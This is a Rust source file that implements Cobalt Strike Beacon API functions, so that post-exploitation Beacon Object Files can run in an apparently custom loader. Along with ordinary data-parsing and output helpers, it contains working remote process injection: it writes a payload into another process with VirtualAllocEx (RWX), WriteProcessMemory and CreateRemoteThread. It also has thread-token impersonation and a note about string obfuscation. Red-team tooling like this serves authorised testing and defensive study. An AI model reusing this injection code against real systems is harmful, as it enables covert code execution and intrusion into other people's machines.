// `beacon_api.rs` - Beacon API functions for BOF compatibility
//
// Based on code from the `coffee` project (GPLv3 license)
// Express permission was granted by the author to use under the MIT license
// https://github.com/hakaioffsec/coffee
//

// Thanks to: https://github.com/yamakadi/ldr/blob/main/src/functions/mod.rs
// for most of the functions and the idea of how to implement them.
use core::slice;
use fmtools::format; // using obfstr to obfuscate
use once_cell::sync::Lazy;
use std::{
    alloc::Layout,
    ffi::{c_char, c_int, c_short, CStr},
    intrinsics, ptr,
};
use windows::Win32::{
    Foundation::{CloseHandle, BOOL, FALSE, HANDLE, TRUE},
    Security::{GetTokenInformation, RevertToSelf, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        Threading::{
            CreateRemoteThread, GetCurrentProcess, OpenProcess, OpenProcessToken, SetThreadToken,
            PROCESS_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, STARTUPINFOA,
        },
    },
};
use windows_sys::Win32::{
    Foundation::FreeLibrary,
    System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
};

#[repr(C)]
#[derive(Clone, Copy)]
pub struct Formatp {
    original: *mut c_char, // original buffer
    buffer: *mut c_char,   // pointer to the buffer
    length: c_int,         // length of the data in the buffer
    size: c_int,           // total size of the buffer
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct Datap {
    original: *mut c_char, // original buffer
    buffer: *mut c_char,   // pointer to the buffer
    length: c_int,         // length of the data in the buffer
    size: c_int,           // total size of the buffer
}

/// is generic output. Cobalt Strike will convert this output to UTF-16 (internally) using the target's default character set.
#[allow(dead_code)]
const CALLBACK_OUTPUT: u32 = 0x0;
/// is generic output. Cobalt Strike will convert this output to UTF-16 (internally) using the target's OEM character set. You probably won't need this, unless you're dealing with output from cmd.exe.
#[allow(dead_code)]
const CALLBACK_OUTPUT_OEM: u32 = 0x1e;
/// is a generic error message.
#[allow(dead_code)]
const CALLBACK_OUTPUT_UTF8: u32 = 0x20;
/// is generic output. Cobalt Strike will convert this output to UTF-16 (internally) from UTF-8.
#[allow(dead_code)]
const CALLBACK_ERROR: u32 = 0x0d;

/// List of internal function names.
pub static INTERNAL_FUNCTION_NAMES: Lazy<Vec<String>> = Lazy::new(|| {
    vec![
        format!("BeaconDataParse"),
        format!("BeaconDataPtr"),
        format!("BeaconDataInt"),
        format!("BeaconDataShort"),
        format!("BeaconDataLength"),
        format!("BeaconDataExtract"),
        format!("BeaconFormatAlloc"),
        format!("BeaconFormatReset"),
        format!("BeaconFormatAppend"),
        format!("BeaconFormatPrintf"),
        format!("BeaconFormatToString"),
        format!("BeaconFormatFree"),
        format!("BeaconFormatInt"),
        format!("BeaconOutput"),
        format!("BeaconPrintf"),
        format!("BeaconUseToken"),
        format!("BeaconRevertToken"),
        format!("BeaconIsAdmin"),
        format!("BeaconGetSpawnTo"),
        format!("BeaconInjectProcess"),
        format!("BeaconInjectTemporaryProcess"),
        format!("BeaconSpawnTemporaryProcess"),
        format!("BeaconCleanupProcess"),
        format!("toWideChar"),
        format!("LoadLibraryA"),
        format!("GetProcAddress"),
        format!("FreeLibrary"),
        format!("GetModuleHandleA"),
        format!("__C_specific_handler"),
    ]
});

/// Match the function name to the internal function pointer.
pub fn get_function_ptr(name: &str) -> Result<usize, Box<dyn std::error::Error>> {
    if name == format!("BeaconDataParse") {
        Ok(beacon_data_parse as usize)
    } else if name == format!("BeaconDataPtr") {
        Ok(beacon_data_ptr as usize)
    } else if name == format!("BeaconDataInt") {
        Ok(beacon_data_int as usize)
    } else if name == format!("BeaconDataShort") {
        Ok(beacon_data_short as usize)
    } else if name == format!("BeaconDataLength") {
        Ok(beacon_data_length as usize)
    } else if name == format!("BeaconDataExtract") {
        Ok(beacon_data_extract as usize)
    } else if name == format!("BeaconFormatAlloc") {
        Ok(beacon_format_alloc as usize)
    } else if name == format!("BeaconFormatReset") {
        Ok(beacon_format_reset as usize)
    } else if name == format!("BeaconFormatAppend") {
        Ok(beacon_format_append as usize)
    } else if name == format!("BeaconFormatPrintf") {
        Ok(beacon_format_printf as usize)
    } else if name == format!("BeaconFormatToString") {
        Ok(beacon_format_to_string as usize)
    } else if name == format!("BeaconFormatFree") {
        Ok(beacon_format_free as usize)
    } else if name == format!("BeaconFormatInt") {
        Ok(beacon_format_int as usize)
    } else if name == format!("BeaconOutput") {
        Ok(beacon_output as usize)
    } else if name == format!("BeaconPrintf") {
        Ok(beacon_printf as usize)
    } else if name == format!("BeaconUseToken") {
        Ok(beacon_use_token as usize)
    } else if name == format!("BeaconRevertToken") {
        Ok(beacon_revert_token as usize)
    } else if name == format!("BeaconIsAdmin") {
        Ok(beacon_is_admin as usize)
    } else if name == format!("BeaconGetSpawnTo") {
        Ok(beacon_get_spawn_to as usize)
    } else if name == format!("BeaconInjectProcess") {
        Ok(beacon_inject_process as usize)
    } else if name == format!("BeaconInjectTemporaryProcess") {
        Ok(beacon_inject_temporary_process as usize)
    } else if name == format!("BeaconSpawnTemporaryProcess") {
        Ok(beacon_spawn_temporary_process as usize)
    } else if name == format!("BeaconCleanupProcess") {
        Ok(beacon_cleanup_process as usize)
    } else if name == format!("toWideChar") {
        Ok(to_wide_char as usize)
    } else if name == format!("LoadLibraryA") {
        Ok(LoadLibraryA as usize)
    } else if name == format!("GetProcAddress") {
        Ok(GetProcAddress as usize)
    } else if name == format!("FreeLibrary") {
        Ok(FreeLibrary as usize)
    } else if name == format!("GetModuleHandleA") {
        Ok(GetModuleHandleA as usize)
    } else if name == format!("__C_specific_handler") {
        Ok(0)
    } else {
        Err(format!("Unknown internal function: "{name}).into())
    }
}

#[repr(C)]
#[derive(Clone)]
pub struct Carrier {
    pub output: Vec<c_char>,
    pub offset: usize,
}

impl Carrier {
    pub const fn new() -> Carrier {
        Carrier {
            output: Vec::new(),
            offset: 0,
        }
    }

    /// Append a char array to the output buffer.
    ///
    /// # Safety
    /// This function is unsafe because it dereferences the given pointer.
    /// The caller must ensure that the pointer is valid and points to a valid memory location.
    pub unsafe fn append_char_array(&mut self, s: *mut c_char, len: c_int) {
        let holder = unsafe { slice::from_raw_parts(s, len as usize) };

        self.output.extend_from_slice(holder);
        self.offset = self.output.len() - holder.len();
    }

    #[allow(clippy::cast_possible_wrap)]
    pub fn append_string(&mut self, s: &str) {
        let mut mapped = s.bytes().map(|c| c as i8).collect::<Vec<c_char>>();

        self.output.append(&mut mapped);
        self.offset = self.output.len() - s.len();
    }

    pub fn flush(&mut self) -> String {
        let mut result = String::new();

        for c in &self.output {
            if (*c as u8) == 0 {
                result.push(0x0a as char);
            } else {
                result.push(*c as u8 as char);
            }
        }

        result
    }

    #[allow(clippy::len_without_is_empty)]
    pub fn len(&self) -> usize {
        self.output.len()
    }

    pub fn reset(&mut self) {
        self.output.clear();
        self.offset = 0;
    }
}

impl Default for Carrier {
    fn default() -> Self {
        Self::new()
    }
}

static mut OUTPUT: Carrier = Carrier::new();

/// Prepare a data parser to extract arguments from the specified buffer.
#[no_mangle]
extern "C" fn beacon_data_parse(parser: *mut Datap, buffer: *mut c_char, size: c_int) {
    if parser.is_null() {
        return;
    }

    let mut data_parser: Datap = unsafe { *parser };

    data_parser.original = buffer;
    data_parser.buffer = buffer;
    data_parser.length = size - 4;
    data_parser.size = size - 4;

    unsafe {
        data_parser.buffer = data_parser.buffer.add(4);
    }

    unsafe {
        *parser = data_parser;
    }
}

#[no_mangle]
extern "C" fn beacon_data_ptr(_parser: *mut Datap, _size: c_int) -> *mut u8 {
    // Isn't well documented.
    unimplemented!();
}

/// Extract a 4b integer.
#[no_mangle]
extern "C" fn beacon_data_int(parser: *mut Datap) -> c_int {
    if parser.is_null() {
        return 0;
    }

    let mut data_parser: Datap = unsafe { *parser };

    if data_parser.length < 4 {
        return 0;
    }

    let result: &[u8] = unsafe { slice::from_raw_parts(data_parser.buffer as *const u8, 4) };

    let mut dst = [0u8; 4];
    dst.clone_from_slice(&result[0..4]);

    data_parser.buffer = unsafe { data_parser.buffer.add(4) };
    data_parser.length -= 4;

    unsafe {
        *parser = data_parser;
    }

    i32::from_ne_bytes(dst) as c_int
}

/// Extract a 2b integer.
#[no_mangle]
extern "C" fn beacon_data_short(parser: *mut Datap) -> c_short {
    if parser.is_null() {
        return 0;
    }

    let mut data_parser: Datap = unsafe { *parser };

    if data_parser.length < 2 {
        return 0;
    }

    let result: &[u8] = unsafe { slice::from_raw_parts(data_parser.buffer as *const u8, 4) };

    let mut dst = [0u8; 2];
    dst.clone_from_slice(&result[0..2]);

    data_parser.buffer = unsafe { data_parser.buffer.add(2) };
    data_parser.length -= 2;

    unsafe {
        *parser = data_parser;
    }

    i16::from_ne_bytes(dst)
}

/// Get the amount of data left to parse.
#[no_mangle]
extern "C" fn beacon_data_length(parser: *mut Datap) -> c_int {
    if parser.is_null() {
        return 0;
    }

    let data_parser: Datap = unsafe { *parser };

    data_parser.length
}

/// Extract a length-prefixed binary blob. The size argument may be NULL. If an address is provided, size is populated with the number-of-bytes extracted.
#[no_mangle]
#[allow(clippy::cast_possible_wrap)]
extern "C" fn beacon_data_extract(parser: *mut Datap, size: *mut c_int) -> *mut c_char {
    if parser.is_null() {
        return ptr::null_mut();
    }

    let mut data_parser: Datap = unsafe { *parser };

    if data_parser.length < 4 {
        return ptr::null_mut();
    }

    let length_parts: &[u8] = unsafe { slice::from_raw_parts(data_parser.buffer as *const u8, 4) };

    let mut length_holder = [0u8; 4];
    length_holder.clone_from_slice(&length_parts[0..4]);

    let length: u32 = u32::from_ne_bytes(length_holder);

    data_parser.buffer = unsafe { data_parser.buffer.add(4) };

    let result = data_parser.buffer;

    if result.is_null() {
        return ptr::null_mut();
    }

    data_parser.length -= 4;
    data_parser.length -= length as i32;
    data_parser.buffer = unsafe { data_parser.buffer.add(length as usize) };

    if !size.is_null() && !result.is_null() {
        unsafe {
            *size = length as c_int;
        }
    }

    unsafe {
        *parser = data_parser;
    }

    result
}

/// Allocate memory to format complex or large output.
#[no_mangle]
extern "C" fn beacon_format_alloc(format: *mut Formatp, maxsz: c_int) {
    if format.is_null() {
        return;
    }

    if maxsz == 0 {
        return;
    }

    let mut format_parser: Formatp = unsafe { *format };

    let mut align: usize = 1;

    while align < maxsz as usize {
        align *= 2;
    }

    let layout_result = Layout::from_size_align(maxsz as usize, align);

    if let Ok(layout) = layout_result {
        let ptr = unsafe { std::alloc::alloc(layout) };

        format_parser.original = ptr.cast::<i8>();
        format_parser.buffer = format_parser.original;
        format_parser.length = 0;
        format_parser.size = maxsz;

        unsafe {
            *format = format_parser;
        }
    }
}

/// Resets the format object to its default state (prior to re-use).
#[no_mangle]
extern "C" fn beacon_format_reset(format: *mut Formatp) {
    if format.is_null() {
        return;
    }

    let mut format_parser: Formatp = unsafe { *format };

    let size = format_parser.size;

    // Free format
    beacon_format_free(&mut format_parser);

    // Alloc format
    beacon_format_alloc(&mut format_parser, size);

    unsafe {
        *format = format_parser;
    }
}

/// Append data to this format object.
#[no_mangle]
extern "C" fn beacon_format_append(format: *mut Formatp, text: *const c_char, len: c_int) {
    if format.is_null() {
        return;
    }

    let mut format_parser: Formatp = unsafe { *format };

    if format_parser.length + len > format_parser.size {
        return;
    }

    unsafe {
        intrinsics::copy_nonoverlapping(text, format_parser.original, len as usize);
    }

    format_parser.buffer = unsafe { format_parser.buffer.add(len as usize) };
    format_parser.length += len;

    unsafe {
        *format = format_parser;
    }
}

/// Append a formatted string to this object.
#[no_mangle]
#[allow(clippy::cast_possible_wrap)]
unsafe extern "C" fn beacon_format_printf(format: *mut Formatp, fmt: *const c_char, mut args: ...) {
    if format.is_null() {
        return;
    }

    let mut format_parser: Formatp = *format;

    let mut s = String::new();
    let bytes_written = printf_compat::format(
        fmt,
        args.as_va_list(),
        printf_compat::output::fmt_write(&mut s),
    );

    if format_parser.length + bytes_written + 1 > format_parser.size {
        return;
    }

    s.push('\0');

    intrinsics::copy_nonoverlapping(s.as_ptr(), format_parser.buffer.cast::<u8>(), s.len());

    format_parser.length += s.len() as i32;

    *format = format_parser;
}

/// Extract formatted data into a single string. Populate the passed in size variable with the length of this string.
/// These parameters are suitable for use with the `BeaconOutput` function.
#[no_mangle]
extern "C" fn beacon_format_to_string(format: *mut Formatp, size: *mut c_int) -> *mut c_char {
    if format.is_null() {
        return ptr::null_mut();
    }

    let format_parser: Formatp = unsafe { *format };

    if format_parser.length == 0 {
        return ptr::null_mut();
    }

    unsafe {
        *size = format_parser.length;
    }

    format_parser.original
}

/// Free the format object.
#[no_mangle]
extern "C" fn beacon_format_free(format: *mut Formatp) {
    if format.is_null() {
        return;
    }

    let mut format_parser: Formatp = unsafe { *format };

    if !format_parser.original.is_null() {
        let mut align: usize = 1;

        while align < format_parser.size as usize {
            align *= 2;
        }

        let layout_result = Layout::from_size_align(format_parser.size as usize, align);

        if let Ok(layout) = layout_result {
            unsafe { std::alloc::dealloc(format_parser.original.cast::<u8>(), layout) };
        }
    }

    format_parser.original = ptr::null_mut();
    format_parser.buffer = ptr::null_mut();
    format_parser.length = 0;
    format_parser.size = 0;

    unsafe {
        *format = format_parser;
    }
}

/// Append a 4b integer (big endian) to this object.
#[no_mangle]
extern "C" fn beacon_format_int(format: *mut Formatp, value: c_int) {
    if format.is_null() {
        return;
    }

    let mut format_parser: Formatp = unsafe { *format };

    if format_parser.length + 4 > format_parser.size {
        return;
    }

    let swapped = swap_endianness(value as u32);
    let mut result = swapped.to_be_bytes();

    unsafe {
        intrinsics::copy_nonoverlapping(
            result.as_mut_ptr(),
            format_parser.original.cast::<u8>(),
            4,
        );
    }

    format_parser.buffer = unsafe { format_parser.buffer.add(4) };
    format_parser.length += 4;

    unsafe {
        *format = format_parser;
    }
}

/// Send output to the Beacon operator.
#[no_mangle]
extern "C" fn beacon_output(_type: c_int, data: *mut c_char, len: c_int) {
    unsafe { OUTPUT.append_char_array(data, len) }
}

/// Retrieves the output data from the beacon.
#[no_mangle]
#[allow(static_mut_refs)]
pub extern "C" fn beacon_get_output_data() -> &'static mut Carrier {
    unsafe { &mut OUTPUT }
}

/// Format and present output to the Beacon operator.
#[no_mangle]
unsafe extern "C" fn beacon_printf(_type: c_int, fmt: *mut c_char, mut args: ...) {
    let mut s = String::new();

    printf_compat::format(
        fmt,
        args.as_va_list(),
        printf_compat::output::fmt_write(&mut s),
    );

    s.push('\0');

    OUTPUT.append_string(&s);
}

/// Apply the specified token as Beacon's current thread token.
/// This will report the new token to the user too.
///
/// # Returns
/// Returns TRUE if the token was successfully applied, FALSE otherwise.
#[no_mangle]
extern "C" fn beacon_use_token(token: HANDLE) -> BOOL {
    match unsafe { SetThreadToken(Some(std::ptr::null()), token) } {
        Ok(()) => TRUE,
        Err(_) => FALSE,
    }
}

/// Drop the current thread token. Use this over direct calls to `RevertToSelf`.
/// This function cleans up other state information about the token.
#[no_mangle]
extern "C" fn beacon_revert_token() {
    if let Ok(()) = unsafe { RevertToSelf() } {
    } else {
        // warn!("RevertToSelf Failed!");
    }
}

/// Check if the current Beacon is running in an elevated context.
///
/// # Returns
/// Returns TRUE if Beacon is in a high-integrity context.
#[no_mangle]
extern "C" fn beacon_is_admin() -> BOOL {
    let mut token: HANDLE = HANDLE(0);
    let token_elevated: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };

    let open_token_result =
        unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) };
    if open_token_result.is_err() {
        return FALSE;
    }

    let get_token_info_result = unsafe {
        GetTokenInformation(
            token,
            TokenElevation,
            Some(std::ptr::from_ref(&token_elevated) as *mut _),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            std::ptr::null_mut(),
        )
    };
    if get_token_info_result.is_err() {
        return FALSE;
    }

    if token_elevated.TokenIsElevated == 1 {
        return TRUE;
    }

    FALSE
}

/// Populate the specified buffer with the x86 or x64 spawnto value configured for this Beacon session.
#[no_mangle]
extern "C" fn beacon_get_spawn_to(_x86: BOOL, _buffer: *const c_char, _length: c_int) {
    unimplemented!();
}

/// This function will inject the specified payload into an existing process.
/// Use `payload_offset` to specify the offset within the payload to begin execution.
/// The arg value is for arguments. arg may be NULL.
#[no_mangle]
extern "C" fn beacon_inject_process(
    _hproc: HANDLE,
    pid: c_int,
    payload: *const c_char,
    p_len: c_int,
    _p_offset: c_int,
    arg: *const c_char,
    a_len: c_int,
) {
    unsafe {
        if let Ok(process_handle) =
            OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, None, pid as u32)
        {
            if process_handle.is_invalid() {
                return;
            }

            let payload_slice = std::slice::from_raw_parts(payload.cast::<u8>(), p_len as usize);
            let _arg_slice = std::slice::from_raw_parts(arg.cast::<u8>(), a_len as usize);

            let remote_payload_address = VirtualAllocEx(
                process_handle,
                None,
                payload_slice.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if remote_payload_address.is_null() {
                let _ = CloseHandle(process_handle);
                return;
            }

            if WriteProcessMemory(
                process_handle,
                remote_payload_address,
                payload_slice.as_ptr().cast(),
                payload_slice.len(),
                None,
            )
            .is_err()
            {
                let _ = CloseHandle(process_handle);
                return;
            }

            if let Ok(thread) = CreateRemoteThread(
                process_handle,
                None,
                0,
                Some(std::mem::transmute::<
                    *mut std::ffi::c_void,
                    unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
                >(remote_payload_address)),
                None,
                0,
                None,
            ) {
                let _ = CloseHandle(thread);
            };

            let _ = CloseHandle(process_handle);
        };
    }
}

/// This function will inject the specified payload into a temporary process that your BOF opted to launch.
/// Use `payload_offset` to specify the offset within the payload to begin execution.
///
/// # Arguments
/// The `arg` value is for arguments, which may be NULL.
#[no_mangle]
extern "C" fn beacon_inject_temporary_process(
    _pinfo: *const PROCESS_INFORMATION,
    _pid: c_int,
    _payload: *const c_char,
    _p_len: c_int,
    _p_offset: c_int,
    _arg: *const c_char,
    _a_len: c_int,
) {
    unimplemented!();
}

/// This function spawns a temporary process accounting for ppid, spawnto, and blockdlls options.
/// Grab the handle from `PROCESS_INFORMATION` to inject into or manipulate this process.
#[no_mangle]
extern "C" fn beacon_spawn_temporary_process(
    _x86: BOOL,
    _ignore_token: BOOL,
    _si: *const STARTUPINFOA,
    _pinfo: *const PROCESS_INFORMATION,
) -> BOOL {
    unimplemented!();
}

/// This function cleans up some handles that are often forgotten about. Call this when you're done interacting with the handles for a process. You don't need to wait for the process to exit or finish.
#[no_mangle]
extern "C" fn beacon_cleanup_process(pinfo: *const PROCESS_INFORMATION) {
    unsafe {
        let _ = CloseHandle((*pinfo).hProcess);
        let _ = CloseHandle((*pinfo).hThread);
    }
}

/// Convert the src string to a UTF16-LE wide-character string, using the target's default encoding. max is the size (in bytes!) of the destination buffer.
#[no_mangle]
extern "C" fn to_wide_char(src: *const c_char, dst: *mut c_short, max: c_int) -> BOOL {
    if src.is_null() {
        return FALSE;
    }

    let c_str: &CStr = unsafe { CStr::from_ptr(src) };

    let str_slice: &str = match c_str.to_str() {
        Ok(s) => s,
        Err(_) => return FALSE,
    };

    let mut size = str_slice.len();

    if size > max as usize {
        size = max as usize - 1;
    }

    let mut v: Vec<u16> = str_slice.encode_utf16().take(size).collect();
    v.push(0);

    unsafe { ptr::copy(v.as_ptr(), dst.cast::<u16>(), size) };

    TRUE
}

#[no_mangle]
pub extern "C" fn swap_endianness(src: u32) -> u32 {
    let test: u32 = 0x0000_00ff;

    // if test is 0xff00, then we are little endian, otherwise big endian
    if (((test >> 24) & 0xff) as u8) == 0xff {
        return src.swap_bytes();
    }

    src
}
